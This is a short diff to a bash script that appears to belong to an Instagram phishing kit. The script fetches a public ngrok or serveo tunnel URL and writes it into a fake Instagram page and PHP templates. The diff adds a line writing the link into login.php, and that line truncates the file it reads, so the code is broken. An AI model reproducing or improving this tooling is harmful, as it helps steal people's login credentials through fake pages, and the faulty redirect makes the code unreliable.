@@ -115,7 +115,7 @@ payload_ngrok() {
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 sed 's+forwarding_link+'$link'+g' instagram.html > index2.html
 sed 's+forwarding_link+'$link'+g' template.php > index.php
-
+sed 's+forwarding_link+'$link'+g' login.php > login.php
 
 }
 
@@ -203,7 +203,7 @@ send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 
 sed 's+forwarding_link+'$send_link'+g' insatgram.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
-
+sed 's+forwarding_link+'$send_link'+g' login.php > login.php
 
 }
 
